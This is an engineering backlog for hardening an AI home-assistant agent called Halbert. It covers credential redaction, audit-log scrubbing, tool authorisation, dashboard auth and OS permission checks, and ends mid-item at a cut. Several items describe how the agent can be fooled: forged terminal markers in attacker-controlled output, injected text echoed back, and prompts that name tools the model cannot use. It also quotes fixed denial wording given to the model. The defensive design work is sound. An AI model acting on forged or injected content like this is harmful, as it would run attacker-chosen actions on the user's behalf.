One packet over `model/llm_config.py`, `dashboard/routes/llm.py`, `ingestion/redaction_registry.py`, `crypto/storage.py`, `config/queries.py`, `security/echo_guard.py`. Extends the lifted variant registry. Related audit gap A03-G4 (MCP client credentials never registered).

- **Register Halbert's own credentials with the redaction registry at every resolution** (OC12-state-sessions-secrets-security-shared-M2 verifier-added; A03-G4 is the MCP half) — origin `src/secrets/sentinel.ts:53-57, 62-64, 97-101` (mint, seal AND resolve all re-register; re-registering on use keeps a long-lived credential from FIFO eviction). Halbert: the registry (`redaction_registry.py:32-92`) refreshes recency and evicts FIFO correctly; its ONLY producer is `config/queries.py:358-359` (Tier-2 host-config reads); `llm_config.py:465, 898-906, 977-983` and `routes/llm.py:74-89` hand the API key out and into headers without ever registering it, so a key echoed in a tool result, error string or model reply is not redacted. Task: `get_global_registry().register(key)` + `get_global_echo_guard().note_injected(key)` at `resolve()` and `api_key_for()`, and at `mcp/config.py:183 resolve_token` and server-env load (A03-G4). Effort S. High.
- **Redact the just-sent credential out of provider error/test bodies** (OC22-extensions-local-providers-apps-C6) — origin `extensions/lmstudio/src/models.fetch.ts:28-44` (every outgoing header value and its bearer-stripped form, longest-first). Halbert: `routes/llm.py:639, 697, 714, 727, 791, 814, 838, 861` return truncated raw provider bodies (the reader's line numbers were off and missed four sites); the file imports nothing from `security/`. Task: scrub the request's own header values out of the body before returning; once M2 lands, the registry pass covers this too. Effort S, medium.
- **Normalise pasted credentials; ASCII-validate credential-shaped keys** (OC12-state-sessions-secrets-security-shared-M4 verifier-added, HM15-cli-model-config-ux-C13; confirmed twice) — origin `src/utils/normalize-secret-input.ts:1-47` (strip CR/LF/LS/PS anywhere, drop non-Latin1 and C0/C1, trim ends, keep interior spaces; empty -> unset), `hermes_cli/env_loader.py:19-20, 195-204` (only `_API_KEY/_TOKEN/_SECRET/_KEY` vars are ASCII-checked because they become headers). Halbert: `llm_config.py:460-466` stores `str(ep.get('api_key'))` verbatim; `model/client.py:526-534` builds `Authorization: Bearer {api_key}` — a smart quote from a browser paste surfaces as a `UnicodeEncodeError` inside http.client. Task: `normalize_secret_input()` at the one coercion point; narrow ASCII validation on credential-shaped keys at load. Effort S. C13 raised low -> medium by the verifier on the verified failure site.
- **SecretRef over the existing custody ladder; secrets plan contract; plaintext self-audit** (OC19-extensions-identity-security-ops-C6, OC07-cli-wizard-tui-entry-C7, OC12-state-sessions-secrets-security-shared-C3, OC24-docs-qa-security-skills-C5, OC04-commands-C6) — origin `extensions/vault/vault-secret-id.js:1-23`, `vault-secret-ref-resolver.js:140-209, 372-416`, `src/config/types.secrets.ts:7-24` + `src/gateway/auth-token-store-ref.ts:24-59` (store write ordered BEFORE the config write; an existing store entry wins on rerun), `src/secrets/ref-contract.ts:17-125` (`{source: env|file|exec|store, provider, id}`), `docs/gateway/secrets-plan-contract.md:14, 105, 119-125` (16 MiB plan cap, `__proto__`/`constructor` segments rejected, validate-then-snapshot-then-write, dry-run default), `src/commands/doctor-security.ts:236-275` + `src/secrets/target-registry-query.ts:530` (a declared registry of every config path that CAN hold a secret; a ref is fine, a live plaintext value is flagged). Halbert: the verifier corrected "no storage layer" to partial — `crypto/storage.py` (639 lines) IS a pluggable custody ladder (File 0700/0600, Keychain, Secret Service, hardware seam) holding only the Ed25519 audit key, while `llm_config.py:136, 465, 593-594, 790-826, 904` keeps provider keys as plain strings in models.yml — exactly OpenClaw's own advisory ghsa-jjw7-3vjf-fg5j; `model/config_layers.py:275-318` carries `api_key` inline through the layers; nothing walks Halbert's own config for plaintext. Task: a `{source, provider, id}` ref grammar and a named-credential kind ON TOP OF `crypto/storage.py` (a parallel backend would violate the repo's own ladder), `saved_endpoints[].api_key` routed through it with strict id parsing and per-id failure reporting, store-before-config ordering, a declared registry of Halbert config paths that may hold a credential audited on every doctor run, and the apply-plan discipline for batched config mutation. Effort M (C6 raised medium -> high by the verifier; C7/C3/C5/C6-doctor medium; C6-doctor and OC24-M3's posture catalog should be one task). Constraint: Tier-2 deterministic template; the value never round-trips through a model.
- **Seal resolved secrets into opaque tokens; unresolved sentinel at egress is a hard error** (OC12-state-sessions-secrets-security-shared-C1) — origin `src/secrets/sentinel.ts:24-125` (process-global key, keyed-HMAC nonce so re-sealing is stable, AES-256-GCM with scope as AAD), `egress-proxy/stream-substitution.ts:36-83`. Halbert: absent; the variant-registry half was lifted, the sealing half was surfaced by the 2026-09-07 review (`OSS-REVIEW-OPENCLAW:141`) and never packeted. Task: when a credential is resolved for `execute_code` or an outbound call, seal it; only the outbound HTTP site resolves it, immediately before use; a sentinel-shaped string surviving into a subprocess env, log or tool result is a hard error. Effort M (verifier demoted high -> medium). Founder decision F-A5 — this is the one item here that adds a subsystem. Note the origin's `mintSecretSentinel` is env-disable-able; port only the unconditional `seal` path.
- **A channel-echo axis distinct from action authorisation** (OC19-extensions-identity-security-ops-C2) — origin `extensions/device-pair/pair-command-auth.ts:16-79` (approve a pairing without being allowed to receive the secret in this channel). Halbert: verifier raised low -> medium — `config/queries.py:242-340`'s tier router decides Tier-2 disclosure on tier/expiry alone; "channel" does not appear, so a value released under `cloud_ok_acknowledged` is spoken aloud on voice exactly as it is shown on the dashboard; `persona/permission/channels.py:16-35` is the distribution ceiling, not the talk channel. Task: a channel-echo check in the tier router keyed on `current_turn_channel`; voice never carries a Tier-2 value. Effort S.
- **Runtime backstop against credential + off-host base_url pairing** (HM16-cron-second-pass-C13) — origin `cron/scheduler_prompt.py:298-317`, `tools/cronjob_job_args.py:237-249`. Halbert: no per-job provider override exists and the standing directive (connection slots, not model menus) argues against adding one. Record the generic rule: validate at every entry point that can reach dispatch. Low, no code.

#### Theme 8 — Redaction and display seams: every text that leaves the process, including errors, logs and history reads

One packet over `agents/events.py`, `security/display_transport.py`, `security/result_redaction.py`, `tools/executor.py` (hot: the block/audit log lines), `routes/agent.py` (hot: `GET /agent/timeline`), `components/agent/Timeline.tsx`, `agents/turn_event_tee.py`, `obs/audit.py`. Composes with A03-G1/G2/G5/G9, A05-G1/G2/G5/G9 and the parked 05-C question.

- **Tool-failure and block logs carry raw args into the audit chain** (OC14-agents-second-pass-A-C3) — origin `src/agents/agent-tool-definition-adapter.ts:48-50, 120-188` (a sensitive value becomes `{omitted, reason, type, chars, sha256[:16]}`; env values a fixed sentinel; recursion into JSON-string params). Halbert: `executor.py:573, 592` log `{tool_name} {args}` raw and `_audit` at `:743-760` forwards args unredacted into the tamper-evident `obs/audit.py` chain — a shell command with an inline credential is written to a log that is by design not editable. Task: `redact_result()` over raw/effective params before any failure log or audit row, plus a 16-hex correlation hash for command-like fields. Effort S. High; the verifier named it the highest-value item in its unit.
- **Close the audit `extras` bag** (OC24-docs-qa-security-skills-M3 verifier-added) — origin `docs/gateway/audit.md:12-27, 51-56` (metadata-only ledger; never prompts, tool arguments, results, filenames, URLs, command output or raw error text; audit rows are not authorisation evidence). Halbert: `obs/audit.py:240-275` gets the named fields right, then `payload.update(extras)` at `:272` writes "whatever a tool result or a model-supplied string happened to contain". Task: a declared allowlist of extra keys per tool (or `redact_text` over extras as `security/turn_digest.py:14-19` already does), and record the "audit is not authorisation evidence" boundary against `consent/store.py`. Effort S, medium.
- **Error text goes through the registry too; redaction lives in the envelope builder** (HM12-gateway-rooms-platforms-hooks-M4 verifier-added; A03-G5 is the MCP dispatcher half) — origin `gateway/platforms/api_server_runs.py:147-176, 518-540`. Halbert: `agents/events.py:210-259` redacts `args`/`result` via `verbose_text` but `error` is exempted by docstring (`:246-249`), likewise `StreamEvent.error` (`:337-341`) and `thread_store_error` (`:779-781`); `result_redaction.py:11-15` records that internal results are "deliberately NOT" routed through the core. Task: the registry pass inside the `StreamEvent` constructor for every text field including `error`; decide the 05-C question (F-A7) and, if yes, one `redact_result` call at the executor's result seam. Effort S.
- **History reads get the same projection as live events; a browser-side second pass** (OC16-gateway-second-pass-A-C11, OC23-control-ui-C20; A05-G2 is the same finding) — origin `src/gateway/chat-display-projection.sanitize.ts:36-56, 135-220`, `ui/src/lib/browser-redact.ts:10-89` (reuses the server's own pattern module). Halbert: `display_transport.py` covers only live SSE; `GET /agent/timeline` (`routes/agent.py:2325-2356`) returns `blocks_json` straight from the store and `Timeline.tsx:127, 134-135` renders `result`/`outputHead`/`outputTail` raw; the only "redaction" there is user-initiated forgetting. Task: map each block through `verbose_text` at the timeline route (store stays full fidelity per `display_transport.py:8-11`), and a client-side pattern pass compiled from the same `DEFAULT_REDACT_PATTERNS` served as data. Effort M + S. Verifier rescoped C11: the origin's local-path stripping does not transfer (Halbert identifies as the host); C20 raised medium -> high.
- **Model-facing truncation keeps the wrong end** (OC19-extensions-identity-security-ops-M5 verifier-added) — origin `extensions/tokenjuice/index.ts:9-13`, `tool-result-middleware.ts:22-97`. Halbert: `state_machine.py:43-46, 153-161` keeps the HEAD (2,000 chars) while `display_transport.py:39-60` keeps the TAIL with the written reasoning "the tail is the part a user reads when a command fails" — the model gets the banner, the operator the error. Task: tail-preferring or head+tail with an elision marker for the model; if a second shaper is ever added, make it a registered seam rather than another inline slice. Effort S, medium. Touches state_machine.py (hot).
- **Chat input sanitised; internal-context markers stripped from model-authored status text** (OC16-gateway-second-pass-A-C9, OC09-tasks-system-agent-flows-boards-claws-M5 verifier-added; A05-G10 is the same) — origin `src/gateway/chat-input-sanitize.ts:1-22` (NFC, NUL rejected not stripped, C0 except tab/LF/CR), `src/tasks/task-status.ts:56-125` (cut from the first internal-context marker onward before any status/notification surface). Halbert: `SendMessageRequest.message` (`routes/agent.py:49`) is a bare `str` with no max length or sanitiser; two sanitisers exist to reuse (`discovery/schema.py:27-37`, `observation_text.py:88-105` — the latter collapses whitespace, wrong for chat); the echo guard catches re-echoed injections but not a model quoting the scaffolding it was handed. Task: a chat variant of `observation_text` at the top of `send_message` with a length ceiling; marker constants in the prompt-assembly module cut at the redaction choke point for status lines, notifications, progress cards and the Presence Pill. Effort S + S.
- **The observe-only tee fails closed and hands out isolated copies** (OC06-plugins-sdk-M2 verifier-added, OC06-plugins-sdk-M3 verifier-added; A09 bug "tee scrubs only top-level strings" is the same) — origin `src/plugins/hook-runner-global.ts:43-49` + `hooks.ts:128-183` (failure direction and time budget declared per extension point in one table), `hook-isolation.ts:5-76`. Halbert: `turn_event_tee.py:82-85 _scrub_text` returns the ORIGINAL text when the guard or registry raises and fans it out to a second screen and the voice HUD (fail-open inherited from `_echo_guard_egress`, where it is defensible); `:116-133` passes one shared dict to every subscriber and scrubs only top-level strings. Task: fail closed at the tee (blank the payload), deep-copy per subscriber, recursive scrub, and one table recording the fail direction of each observation-vs-policy seam (101 hand-written "non-fatal" swallows exist). Effort S.
- **Structural URL redaction: named query params and nested-URL decode** (OC13-packages-C2) — origin `packages/net-policy/src/redact-sensitive-url.ts:11-51, 119-125, 501`. Halbert: the verifier ran the real redactor — `?token=`/`?api_key=` already redact, separator-splice and percent-encoded names already redact, but `?sig=AAAA...` and `?next=https%3A%2F%2Fh2%2Fx%3Ftoken%3D...` pass unredacted. Task: a conservative named-param allowlist (sig, x_amz_signature, ...) and a bounded nested decode in `ingestion/redaction.py`, called from `mcp/config.py:147-153 redact_url`. Effort S, medium.
- **Media/file delivery deny-list at the outbound seam** (HM12-gateway-rooms-platforms-hooks-C1) — origin `gateway/platforms/base.py:778-893, 1086-1147` (allow-list of own output dirs, deny-list of credential paths and SQLite sidecars, strict-mode recency window, log lines with control characters stripped so a model-emitted path cannot forge a log entry). Halbert: verifier corrected absent -> partial — two per-surface allowlists exist (`mcp/server.py:84-113`, `routes/modules.py:41-68`); absent is a shared DENY list naming Halbert's own secret stores (conversation SQLite + sidecars, dashboard token, MCP OAuth tokens, consent ledger) and any outbound file-handback choke point. Task: `security/media_delivery.py` deny-list + `_log_safe_path`, mandatory for any tool/route returning a local file. Effort M, medium.
- **Terminal output: forged OSC 133 markers and control sequences** (OC12-state-sessions-secrets-security-shared-M3 verifier-added) — origin `src/shared/resume-handoff.ts:22-46`, `packages/terminal-core/src/safe-text.ts:5-17` (strip ANSI first so removed bytes cannot form a new sequence, then escape remaining C0/C1). Halbert: `streaming/shell_integration.py:183-205` parses OSC 133 A/B/C/D from the raw PTY stream; a command whose OUTPUT contains a D sequence (a `cat` of an attacker file, a remote banner) becomes a real block boundary with an attacker-chosen id and exit code that `watched_shell.py` hands to the model as "what the user ran"; `streaming/redact.py` redacts credentials but strips no controls. Task: accept a C/D marker only when its id matches one this host minted this session; sanitise block text (ANSI strip, then C0/C1 escape) on the path into persistence and the prompt. Effort S. Medium. Constraint: bytes to xterm.js stay untouched — this is the prompt/persistence copy only.
- **Fail-closed egress scrub for any future export** (HM04-agent-learning-verification-review-C14, HM04-agent-learning-verification-review-C17 — one rule at two boundaries) — origin `agent/monitoring/redaction.py:3-61` (`[redaction-unavailable]` sentinel on any redactor exception), `agent/trace_upload.py:22-58, 242-246` (a redactor failure aborts the upload). Halbert: no export path exists; note that `security/result_redaction.py` has no try/except at all, so it fails closed by accident of the call stack. Record as a required pattern on any export/share/debug-bundle ticket. Low.

#### Theme 9 — The policy pipeline: registration carries authorisation, denials are uniform and final, scope is data

One packet over `tools/executor.py` (hot: `register`, `get_schemas`, `execute`), `tools/safety.py`, `persona/policy.py`, `agents/channels.py`, `consent/denials.py`, `persona/permission/effective.py`. Extends the lifted lattice and typed denials; the strengthenings A11-G1/G2/G7 and A12-G2/G6 belong in the same packet.

- **Authorisation is a field on the registration descriptor; missing or duplicate is a startup error** (OC17-gateway-second-pass-B-M1 verifier-added, OC17-gateway-second-pass-B-C1) — origin `src/gateway/methods/descriptor.ts:29-68`, `registry.ts:26-70` (throws on a missing scope and on a duplicate name because "authorization and handler dispatch would disagree about the owner"), `method-scopes.ts:57-74, 130-202, 215-230, 262` (static table + params-aware resolvers; an unclassified method is fail-closed TO ADMIN, the verifier's precision fix). Halbert: `executor.py:384-394 register(name, handler, schema)` stores handler+schema, silently overwrites a duplicate, and `safety.py:553-559`'s final branch returns MEDIUM/allowed/"Unknown tool" — a tool registered without a safety branch runs with a warning; the params-aware half exists (`safety.py:531-551`). Task: `register()` takes a required `ToolDescriptor` (risk/scope), raises on duplicate or missing, `classify()` looks the descriptor up and the fall-through becomes deny; then a name -> required-scope table with resolvers for the dangerous tools. Effort S + M. High. Do this first; everything below hangs on it.
- **Named policy layers with per-layer removal audit; channel-scoped tool denial as declared data** (OC15-agents-second-pass-B-C1, OC14-agents-second-pass-A-M5 verifier-added) — origin `src/agents/tool-policy-pipeline.ts:20-33, 55-132, 154-241`, `agent-tools.message-provider-policy.ts:8-36` (voice denies tts; allow-list wins outright; unknown provider filters nothing). Halbert: verifier corrected the reader — `persona/policy.py:53-62 merge_policies` IS the layered lattice (min security, max ask, docstring naming exec-approvals-core) and `effective.py:15-27` names a decisive axis; genuinely missing: layers are anonymous, and the tool-list filters are four uncomposed checks (`guest_tools.py` applied twice in `executor.py`, RoleGate, `federation/tool_allowlist.py`, MCP config); `ChannelDeclaration` (`channels.py:53-129`) has no tool dimension, so a voice turn can reach `frigate_get_snapshot`/`capture_webcam`. Task: name the layers, one shared matcher, structured per-layer removal logs; a narrowing-only `denied_tools` frozenset on `ChannelDeclaration` applied at `get_schemas` and re-checked in `execute()` like the guest gate. Effort M + S. Constraint: a channel may never widen a set.
- **Blocked-tool list for delegated children at toolset and tool granularity; parent-ceiling intersection** (HM05-delegation-subagents-kanban-C1) — origin `tools/delegate_tool_toolsets.py:13-22, 37-109` (the load-bearing invariant is the intersection with the parent's composite-expanded set; the deny-list is the floor). Halbert: `agents/subagent.py` has no tool concept (`SubagentHandle` fields `:38-51`); the one real subagent runs fixed read-only probes. Task: `HALBERT_SUBAGENT_BLOCKED_TOOLS` (no recursive spawn, no memory writes, no notifications, no scheduler self-writes) plus the parent-ceiling rule, applied before a child's tool list is built. Effort S, medium.
- **One uniform blocked-event taxonomy; a denial states its own finality; a generic attribution record for every gated call** (OC14-agents-second-pass-A-C9, OC14-agents-second-pass-A-M4 verifier-added, OC14-agents-second-pass-A-C5) — origin `agent-tools.before-tool-call.diagnostics.ts:442-499` ({policyId, controlId, family}), `before-tool-call.approval.ts:43-57` (four fixed sentences: it did not run, the request is closed, do not retry or coach the user, a new call makes a fresh request), `before-tool-call.decision.ts:13-57` (AsyncLocalStorage flag + finally-block fallback record with a deterministic receipt id). Halbert: two unrelated denial vocabularies (`consent/denials.py:33-62` typed; `executor.py:573/592` log + `_audit` row); block results give the model only "Operation blocked for safety: {reason}" and there is no loop detection, so a deterministic denial invites retries for the rest of the turn; three executor paths return with no record (guest refusal `:490-494`, unknown tool `:525-529`, `THREAD_META_TOOLS` `:536-545`) and `_audit` has no idempotency key, so a retried dispatch double-logs into an append-only chain. Task: one `tool.execution.blocked` shape emitted by the lattice, MCP policy and consent-timeout paths; a fixed template-produced finality clause on every block; a context manager around execution writing a fallback attribution row in `finally` with a deterministic key unless a ContextVar flag says one was recorded. Effort M + S + M. C9 and C5 demoted high -> medium by the verifier; M4 is the cheapest and should go first.
- **Cross-tool guidance gated on this turn's actual tool set** (OC14-agents-second-pass-A-M3 verifier-added) — origin `agent-tools.deferred-followup.ts:14-99` (descriptions rewritten LAST over the surviving set). Halbert: `prompts/agent_prompts.py:874` says "must not be told to call a tool it cannot see" and then gates at `:876` on `tools_supported`, a MODEL-capability flag, so a guest-fronting prompt still tells the model to call `recall_memory` and `execute_code`. Task: thread the `get_schemas` name set into the prompt builder and gate every tool-naming section on membership; a test that the guest-fronting prompt names no tool outside `GUEST_ALLOWED_TOOLS`. Effort S. High.
- **Run-scoped tool handles die with the run** (OC14-agents-second-pass-A-M1 verifier-added; A04-G2 is the same defect) — origin `agent-tools.ring-zero-context.ts:5-89` (every retained handle fails after settlement; revoking discovery is not enough). Halbert: `execute_code.py:388, 458-473, 511-513` pops the module but the sealed `_call` bound into a wedged daemon thread keeps dispatching REAL tool calls with the remaining budget after the run reported a timeout. Task: `ScriptRpcHost.retire()`; `handle()` checks it first and returns a free structured refusal. Effort S. High.
- **Reset-only session authority distinct from command authority** (OC03-auto-reply-C6) — origin `src/auto-reply/command-auth.ts:41, 339-372, 592-609` (the verifier corrected the citation). Halbert: the lattice is capability-keyed, so this degenerates cleanly to one capability (`session.stop_own_turn`) granted to a guest without owner-level command access. Effort S, medium.
- **Consent explain and permission explain over the existing evidence** (OC04-commands-C13, OC24-docs-qa-security-skills-C15, OC04-commands-C14) — origin `src/commands/audit.ts:33-37, 402-429, 431-498, 515-543` (unverified provenance -> "receipt prose omitted"; unknown coverage -> "do not infer authorization"; a distinct Missing-evidence section; hard page caps, cursor pagination, incompatible-flag validation), `src/commands/sandbox-explain.ts` via `docs/gateway/sandbox-vs-tool-policy-vs-elevated.md:8-28, 139-152` (real code — the reader's `220-235` does not exist in a 160-line file). Halbert: verifier corrected absent -> partial — `effective.py:84-163` already carries the decisive axis, reason code and the full axis observations "so any refusal can be explained after the fact", and returns `REASON_OS_UNKNOWN` fail-closed for undetermined OS grants (stronger than the origin's prose). Missing: the surface — `halbert consent explain <event-id>` / `permission_explain()` rendering lineage, policy refs consulted, fix-it config keys, and a Missing-evidence section that never upgrades silence into an allow; C14's caps if a list CLI is built. Effort M + S + S(low).
- **Per-reason remedy line and one formatter for refusals outside the taxonomy** (OC06-plugins-sdk-C11) — origin `src/plugins/plugin-trust.ts:5-49`. Halbert: verifier corrected absent -> PRESENT — `consent/denials.py:52-88` is a closed set with one copy table shared by UI and voice, and `Denied.__init__` refuses an invented reason. Kept only for two strengthenings: a shipped remedy string per reason, and pulling `is_local_model()`'s cloud-tag refusal, `mcp/config.py` risk gating and `skills/loader.py` refusals into the same formatter. Effort S, low. Constraint: remedies are shipped text, never generated.
- **Presence and camera rows filtered by the session-visibility rule before any field, including timing** (OC17-gateway-second-pass-B-C18) — origin `src/gateway/presence-projection.ts:46-74`. Halbert: verifier corrected absent -> partial — `home/occupancy.py` is a live presence roster, `mcp/camera_gate.py:5-25` names the exact leak class and is wired at the dispatch choke point but says its per-source ownership gates are unwritten ("a camera handed to a guest would be projected by name here"). Task: filter camera/occupancy rows through the ownership divide before projection, ordering included. Effort S, medium.
- **Zero-tool, strictly grounded first-contact turn with a durable one-shot claim** (OC18-channels-cron-second-pass-C17) — origin `src/channels/join-intro/join-intro-prompt.ts:16-17, 41-43, 82`, `report-channel-room-join.ts:30, 88-117, 158-166, 188-193` (`toolsAllow: []`, `externalContentSource: 'webhook'`, 90-day claim keyed on the surface). Halbert: no zero-tool first-contact path. Task: when the guest persona or sibling-home pull channel first ingests a new peer/surface, run that turn with an empty tool grant and the grounding language, keyed by a durable (peer, surface) claim. Effort M, medium. Constraint (verifier-endorsed): do NOT copy the proactive greeting — the first-contact behaviour is a log entry or a pending-review item, never an unsolicited model-authored message.
- **Fail-closed ownership check; snapshot the effective policy once at admission** (OC09-tasks-system-agent-flows-boards-claws-C5, HM12-gateway-rooms-platforms-hooks-C8) — origin `src/tasks/task-owner-access.ts:24-47`, `gateway/hosted_room_execution_policy.py:21-105` + `api_server_room_grants.py:20-33`. Halbert: `lease.py:41-42` already says "an unwired axis is a closed axis"; the ContextVars `current_speaker_role`/`current_turn_claim` and frozen module constants make the mid-turn mutation race nearly nonexistent; the verifier's adversarial point stands — in-process, the SHA-256 seal is ceremony. Take only: the owning thread id must resolve or refuse (rider on any record store), and snapshot the one mutable input, the tool registry (`executor.py:366-382 sync_web_search_tool`), at admission. Effort S, both low.
- **Wildcard grants pinned at import** (OC09-tasks-system-agent-flows-boards-claws-C10) — origin `src/claws/tool-profile-consent.ts:55-88`. Halbert: no import surface; the live line where an unbounded grant would become authority is `lease.py:425 if name in covered or "*" in covered`. Record as a standing directive; low.

#### Theme 10 — The dashboard door and the OS-grant axis

One packet over `dashboard/app.py` (hot), `dashboard/auth.py`, `dashboard/__main__.py`, `src-tauri/tauri.conf.json`, `src-tauri/capabilities/default.json`, `routes/audio.py`, `routes/peers.py`, `persona/permission/os_grant.py`, `vision/screen_capture.py`. Composes with TRUST-1's "non-loopback bind refuses without a token".

- **WebSocket auth accepts `?token=`; compute.py appends a key to a URL** (OC24-docs-qa-security-skills-C1) — origin `security/opengrep/precise.yml:3745-3762` (ghsa-rchv-x836-w7xp, CWE-598). Halbert: `auth.py:416-436` falls back to `websocket.query_params.get('token')` (spot-checked, the only `query_params` secret read in the tree); `apiBaseAuth.test.ts:35, 43` pin `?token=` on both WS URLs; second instance the reader missed, outbound: `routes/compute.py:97-116` appends `?key=<api_key>` to a provider URL. Task: accept a `mint_ticket`/`verify_ticket` single-use ticket (already in `auth.py:158-195`) on the WS query string, never the raw token; move compute.py's key to a header. Effort S. High. Halbert state is "present" (the primitive exists) — the task is wiring.
- **Auth-failure limiter that charges wrong credentials and never absent ones; loopback delayed, never locked out** (OC24-docs-qa-security-skills-M1 verifier-added, OC16-gateway-second-pass-A-C1, OC02-infra-rest-C10) — origin `src/gateway/auth.ts:310-385`, `auth-rate-limit.ts:12-16, 38-67, 92-134`, `src/infra/fixed-window-rate-limit.ts:1-66`, `dedupe.ts:27-102`. Halbert: no throttle anywhere on the door (`require_owner` `auth.py:360-385`); `guard_bind` (`:495-511`) permits a non-loopback bind when a token is set and `mint_ticket` HMACs over that same token, so an unthrottled guess on the LAN is both a bypass and a ticket-forgery oracle; the verifier's correction shrinks the work — `mcp/server.py:1667-1710 _RateLimiter` is already better than the origin (monotonic clock, 1024-client LRU) and should be lifted into a shared module, not rewritten. Task: `security/rate_limit.py` from the MCP class, wired into `require_owner`/`websocket_authenticated`, charging only supplied-and-wrong, reset on success, keyed by client host, loopback delayed but never denied; the dedupe cache for Frigate/MQTT ingress separately. Effort S. C1 demoted high -> medium (the token is `token_urlsafe(32)`, so brute force is not the threat; bounded work per attempt is).
- **One inbound-HTTP guard pipeline shared by every listener: body cap, base64 bounds, closed request models, attachment ceiling** (OC19-extensions-identity-security-ops-M4 verifier-added, HM12-gateway-rooms-platforms-hooks-M2 verifier-added, OC13-packages-M5 verifier-added, OC13-packages-M4 verifier-added, OC16-gateway-second-pass-A-C10) — origin `extensions/webhooks/src/http.ts:536-610` (method, content-type, key-bounded rate limiter, per-key in-flight cap, bounded+timed body read, schema — as arguments to one wrapper), `gateway/browser_control_artifacts.py:1-63` (caps before any write; server-minted ids; client filenames are metadata), `packages/gateway-protocol/src/schema/terminal-constants.ts:1-62` (maxLength on the encoded string derived from the byte cap; canonical base64), `closed-object.ts:1-11` (`additionalProperties:false` everywhere), `src/gateway/chat-attachment-policy.ts:9-53` (one function feeds both the advertised and the enforced limit). Halbert: the MCP handler has all of it (`mcp/server.py:1440-1520, 1458, 1576-1587`); the FastAPI app has none — no body cap anywhere, `routes/audio.py:198-215, 257-267` b64decodes an unbounded `audio_base64` without `validate=True` and that route assigns a ROLE ('admin') to the resulting voiceprint, `routes/agent.py:52 images` and `:445-452 _attach_images` have no ceiling, no request model sets `extra='forbid'`. Task: extract the MCP handler's guards into `security/http_guards.py` and apply to the dashboard app, `integrations/wyoming_agent.py`, `federation/peer_middleware.py`; a `StrictRequest` base with `extra='forbid'`; per-field `max_length` from explicit `MAX_*_BYTES` constants and `validate=True`; `resolve_chat_attachment_max_bytes()` used server-side and advertised. Effort M + S + S + S + S. Medium; the audio route is the one to do first.
- **Strict CSP on dashboard HTML; a real CSP and enumerated capabilities in the Tauri shell** (OC16-gateway-second-pass-A-C12, OC22-extensions-local-providers-apps-M3 verifier-added) — origin `src/gateway/control-ui-csp.ts:12-98` (inline scripts hashed, never `unsafe-inline`; `frame-ancestors 'none'`; portal host validated host-only with an empty catch so a bad Host header cannot relax the policy), `apps/linux/src-tauri/tauri.conf.json` (a real CSP; an inline capability enumerating each command the WebView may invoke). Halbert: no CSP, X-Frame-Options, X-Content-Type-Options, Referrer-Policy or Permissions-Policy anywhere; `src-tauri/tauri.conf.json` sets `csp: null` and `capabilities/default.json` grants `core:default` + `opener:default` to both `main` and `voice-hud`. The verifier's material correction: `frontend/index.html:4-14` has an inline prefers-color-scheme script that survives into `dist/` — `script-src 'self'` alone breaks dark-mode bootstrapping; hash it. Task: ASGI middleware in `dashboard/app.py` setting the strict policy with the inline hash computed from the served HTML; a Tauri CSP (report-only first), `core:*` permissions derived from the frontend's `invoke(` call sites, `voice-hud` in its own narrower capability. Effort S + S. High.
- **Gateway network-exposure CRITICAL finding; env-vs-file token conflict diagnostic; instance-scoped session cookie; refuse to run twice** (OC04-commands-C5, OC16-gateway-second-pass-A-M3 verifier-added, OC16-gateway-second-pass-A-M4 verifier-added, OC02-infra-rest-M4 verifier-added) — origin `src/commands/doctor-security.ts:339-403` (the verifier corrected the reader's ranges: CRITICAL `gateway.bind_no_auth` at 378-391, warn at 393-403; `hasSharedSecret` requires the resolved auth MODE to match), `src/gateway/auth-token-source-conflict.ts:21-79`, `control-ui-plugin-auth-cookie.ts:16-20, 65-68, 128` ("cookies are hostname-scoped, never port-scoped"), `src/infra/ports.ts:23-80` + `ports-probe.ts:24-84`. Halbert: `dashboard/app.py:1751-1752` reads `HALBERT_HOST` and passes it to uvicorn with no finding; `auth.py:113-115` gives `HALBERT_API_TOKEN` precedence over the token file while `dashboard/ticket.py:29` and `__main__.py:176-178` mint tickets in a different process, so a mismatch surfaces as "That link has expired" (`auth.py:455-459`); `halbert-host.service` (8000) and `halbert-home.service` (8001) both set `halbert_session` at `path='/'` and evict each other; `__main__.py:47-57 find_available_port` silently starts a second instance on 8001 while the bookmark, the Tauri shell and the ticket point at 8000. Task: a doctor/startup check that classifies the resolved bind host and emits CRITICAL without verifiable token auth; a warn line comparing env token vs file when both exist; cookie name derived from the port or install id; probe the configured port, identify the listener (`lsof` via the trusted-bin resolver), refuse with "I am already running on port <n>" if it is Halbert, plus an advisory flock on a state-dir lock file (pattern at `consent/store.py:245-253`). Effort S each. C5 high; the rest medium. Identity note for M4: a steward that silently forks itself is the opposite of "identifies as the host".
- **Real TCC preflights populate the OS-grant axis; TCC-stable signing identity; one-grant FDA probe; grants keyed per binary identity** (OC22-extensions-local-providers-apps-C1, OC22-extensions-local-providers-apps-C2, HM14-cli-ops-lifecycle-C2, HM14-cli-ops-lifecycle-C3, HM14-cli-ops-lifecycle-M3 verifier-added; confirmed twice) — origin `apps/macos/.../PermissionManager.swift:15-150` (per-capability `authorizationStatus` switch; non-interactive returns false for `.notDetermined`; `UNUserNotificationCenter.current()` aborts in unbundled processes, guarded by `Bundle.main.bundleIdentifier != nil`), `hermes_cli/doctor_platform.py:245-298` (`codesign -d --requirements -`; cdhash DR rotates every rebuild so every grant silently dies; `tccutil reset` remediation), `:320-346` (FDA has no API — `os.listdir(~/Library/Application Support/com.apple.TCC)` and `PermissionError` means no FDA), `hermes_cli/macos_tcc_anchor.py:1-10, 244-368` (grants are keyed to the interpreter binary; a venv symlink into a framework store changes identity on every upgrade). Halbert: `persona/permission/os_grant.py:9-29, 44-49, 84-98` names all of this in prose and ships `DEFAULT_OS_GRANTS = OsGrantTable({})` — "every id reads UNDETERMINED" until D3-P5 wires a preflight; `tauri.conf.json:58 "signingIdentity": null` is the vulnerable regime (HM14-C2 verifier-corrected partial -> absent); `vision/screen_capture.py:312-318` detects denial by string-matching stderr and `:409-413` infers permission from `cg_image is None` (the exact "never infer from the absence of an error" failure the module names); `.venv/bin/python` is a symlink chain to `/Library/Frameworks/Python.framework/.../python3`, so a CLI grant lands on the shared interpreter and every project inherits it. Task: read-only PyObjC/CoreFoundation probes (AVCaptureDevice audio/video, CGPreflightScreenCaptureAccess, AXIsProcessTrusted, notification settings behind the bundle-id guard) populating `OsGrantTable` per channel and recording WHICH binary identity holds the grant; the capture modules call the preflight before shelling out; a doctor row that classifies the bundle DR and names the identity it measured; the FDA listdir probe; and set a real `signingIdentity` (F-A3). Effort M + S + S + S + S. C1 is 